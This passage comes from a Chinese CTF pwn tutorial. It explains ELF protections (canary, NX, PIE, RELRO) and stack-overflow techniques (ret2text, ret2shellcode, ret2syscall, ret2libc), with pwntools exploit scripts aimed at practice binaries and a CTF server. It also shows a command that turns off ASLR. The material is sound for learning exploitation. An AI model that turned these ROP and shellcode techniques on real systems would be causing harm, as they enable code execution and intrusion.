class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># 不过直接用success是可以的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure>



<h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>使用pwntools生成一个pattern（一个str），可以通过其中的一部分数据定位其在一个字符串的位置</p>
<p>做栈溢出题目时，pattern可以减少计算溢出点的时间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)	<span class="comment"># 生成长度0x100的pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)	<span class="comment"># 查找该数据在pattern的位置</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)		<span class="comment"># 可以用字符串查找</span></span><br><span class="line"><span class="comment"># 或者 cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># 注: 在pwndbg中使用</span></span><br></pre></td></tr></table></figure>

<p>比如溢出时构造 <code>cyclic(0x100)</code> ，或者更长，输入后 PC的值变味了 <code>0x61616161</code> 通过 <code>cyclic_find(0x61616161) </code> 就可以得到从哪一个字节开始会控制PC寄存器</p>
<h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>

<p>使用ipython或者log_level &#x3D; ‘debug’ 的话就相当于是checksec了，</p>
<p>我们加载elf文件主要是为了获取一些符号信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="ELF文件保护机制"><a href="#ELF文件保护机制" class="headerlink" title="ELF文件保护机制"></a>ELF文件保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>canary是金丝雀的意思。技术上表示最先测试的（要是在软件或者其他什么东西看到canary版，大概率就是指测试版了）。这种叫法来自以前挖煤时，矿工们会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会有预警。所以大家就会用canary来搞最先的测试。在栈中，<strong>canary表示栈的报警保护。</strong></p>
<p>canary的具体表现是在函数的栈底指针bp前添加一串随机数（不超过机器字长）（又叫cookie），末位是\x00，如果出现缓冲区溢出攻击，覆盖到canary处，并且导致改变该处数据后，<strong>当程序执行到此处（也就是当前函数要结束，准备跳转了），会检查canary值是否跟开始值一样，不一样会导致程序崩溃（应该会看到一串含有smashing的英文）</strong>，从而达到防止程序执行流被恶意控制的目的。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># canary示意图</span></span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">+-------------+ &lt;- </span><br><span class="line">|             | buffer</span><br><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|  canary     |</span><br><span class="line">+-------------+</span><br><span class="line">|    bp       |</span><br><span class="line">+-------------+</span><br><span class="line">|  ret addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br></pre></td></tr></table></figure>

<p><strong>gcc使用：</strong></p>
<p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code> </p>
<p><strong>（关闭 &#x2F; 部分开启 &#x2F; 全部开启）</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o filename filename.c	// 默认不开启canary</span><br><span class="line">gcc -o filename -fno-stack-protector filename.c	// 禁用canary</span><br><span class="line">gcc -o filename -fstack-protector filename.c	// 启用canary，不过只为局部变量中含有char数组的函数插入canary保护</span><br><span class="line">gcc -o filename -fstack-protector-all filename.c	// 启用canary，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>



<h3 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h3><p>NX即No-eXecute（不可执行），NX（DEP）的表现为把数据所在内存页标识为不可执行，当程序溢出到shellcode时，程序会尝试执行指令，此时CPU会抛出异常，而不去执行恶意指令。</p>
<p><strong>gcc使用：</strong></p>
<p><code>-z execstack / -z noexecstack</code> </p>
<p><strong>（关闭 &#x2F; 开启）</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认开启NX</span><br><span class="line">gcc -o file -z execstack file.c	// 禁用NX</span><br><span class="line">gcc -o file -z noexecstack file.c	// 开启NX</span><br></pre></td></tr></table></figure>



<h3 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h3><p>一般情况下NX（DEP）和地址空间分布随机化（PIE &#x2F; ASLR）（address space layout randomization）会同时工作。内存地址随机化机制有三种情况：</p>
<ul>
<li>0 - 表示关闭进程地址空间随机化</li>
<li>1 - 表示将mmap的基地址，栈基地址和.so地址随机化</li>
<li>2 - 表示在1的基础上增加heap的地址随机化</li>
</ul>
<p><strong>该保护使每次运行的程序地址都不同，防止根据固定地址来写exp执行攻击。</strong>这可以防止ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，可以有效阻止攻击者在堆栈上运行恶意代码。</p>
<p><strong>linux下关闭PIE的命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p><strong>gcc用法：</strong></p>
<p><code>-no-pie / -pie</code></p>
<p><strong>（关闭 &#x2F; 开启）</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认关闭PIE</span><br><span class="line">gcc -o file -fpie -pie file.c	// 开启PIE，强度为1</span><br><span class="line">gcc -o file -fPIE -pie file.c	// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -o file -fpic file.c	// 开启PIC，强度为1，不会开启PIE</span><br><span class="line">gcc -o file -fPIC file.c	// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>



<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO（Relocation Read-Only）可以使程序某些部分标识为只读。分为两种情况：</p>
<ul>
<li><strong>Partial RELRO：</strong>是gcc的默认设置，几乎所有二进制文件都至少使用部分RELRO。这样仅能防止全局变量的缓冲区溢出导致覆盖GOT</li>
<li><strong>Full RELRO：</strong>使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动前需要解析所有符号</li>
</ul>
<p><em>linux系统安全领域里，有w（write）权限的储存区就会是攻击的目标，尤其是储存函数指针的区域。所以在安全角度应该尽量减少可写的区域</em></p>
<p><em>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</em></p>
<p><strong>可以简单理解为：</strong></p>
<ul>
<li><strong>Partial RELRO -&gt; .got不可写，got.plt（got表）可写</strong></li>
<li><strong>Full RELRO -&gt; .got 和 got.plt 不可写</strong></li>
</ul>
<p><strong>gcc使用：</strong></p>
<p><code>-z norelro / -z lazy / -z now</code></p>
<p><strong>（关闭 &#x2F; 部分开启 &#x2F; 完全开启）</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认为Partial RELRO</span><br><span class="line">gcc -o file -z norelro file.c	// 关闭，即No RELRO</span><br><span class="line">gcc -o file -z lazy file.c	// 部分开启，即Partial RELRO</span><br><span class="line">gcc -o file -z now file.c	// 完全开启，即Full RELRO</span><br></pre></td></tr></table></figure>



<h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>fortify是轻微的检查，用于检测是否存在缓冲区溢出的错误，适用于程序采用大量字符串或内存操作函数，如：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="是babyROP吧"><a href="#是babyROP吧" class="headerlink" title="是babyROP吧"></a>是babyROP吧</h2><p><strong>什么是ROP:</strong></p>
<p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p>
<p>ROP全称是Return-Oriented Programing（面向返回编程）。简单来说，<strong>ROP就是将源程序中散落的汇编程序片段（也称gadget）“拼接”在一起，使其能够为攻击者服务</strong>。 需要指出的是，此处的“拼接”不是指将这些汇编程序片段聚集在某个连续的内存空间中，而是让它们在逻辑上连续执行，也就是说构成一个”返回链“。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
<p><strong>为什么要ROP:</strong></p>
<p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p>
<p><strong>rop攻击一般要满足：</strong></p>
<p>1）程序存在溢出，并且可以控制返回地址。</p>
<p>2）可以找到满足条件的gadget以及对应的gadget地址（如果gadget每次地址是不固定的，就要想办法动态获取对应地址了）</p>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text（ret to text）实际上就是一种ROP，只不过只返回一次而已（返回到text上），ret2text本质就是控制ret返回到已有的代码上如：system(“&#x2F;bin&#x2F;sh”)， execv(“&#x2F;bin&#x2F;sh”)，从而getshell。</p>
<p>写了一个简单的程序作为例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PS：编译时记得关掉canary和地址随机化</strong></p>
<p>建议直接在wsl里编译就好（懒得开虚拟机捏~）</p>
<p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p>
<p>scanf处没有对读取数据长度做检测，存在溢出</p>
<p>不过直接说可能不好理解，看一下ida吧</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png" alt="main"></p>
<p>栈空间：</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png" alt="stack"></p>
<p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p>
<p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p>
<p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p>
<p>然后4个字节长度是var_4，也就是那个int变量的，这里是直接覆盖过去了；</p>
<p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p>
<p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p>
<p>再一眼后门函数</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png" alt="binsh"></p>
<p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>即控制程序执行shellcode代码，shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode要我们自己填充。</strong></p>
<p>在栈溢出的基础上，要执行shellcode，需要shellcode所在区域有可执行权限。（没有NX保护，或者用mprotect（）为一段区域赋予了可执行权限，或者bss段可执行）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码就是把0x401000开始的长度为0x1000的区域标记为可执行，我们直接把shellcode传进去，即可getshell，由于copy发生在0x401000，但是从0x401020开始执行，所以我们先填充0x20各字节再填充shellcode</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>简单来说就是执行系统调用来实现想要实现的功能，比如可以用 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> 系统调用来获取shell，这需要满足：</p>
<ul>
<li><p>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x3b(x64)</p>
</li>
<li><p>第一个参数，ebx &#x2F; rdi 为 &#x2F;bin&#x2F;sh 地址</p>
</li>
<li><p>第二个参数，ecx 为 0 &#x2F; rsi 为 0</p>
</li>
<li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p>
</li>
<li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p>
<p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p>
</li>
</ul>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png" alt="main"></p>
<p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本，<strong>当然知道libc版本可能也会需要leak基地址来计算system等函数的地址</strong></p>
<p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网），<del><em>也可以本地一个一个试</em></del></p>
<p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p>
<p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p>
<p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png" alt="vuln"></p>
<p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p>
<p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p>
<p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p>
<p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png" alt="findrdi"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure>

<p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p>
<p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png" alt="findret"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">	libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">	libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">	sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">	binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">							#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">	py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure>

<p><strong>完整exp:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span 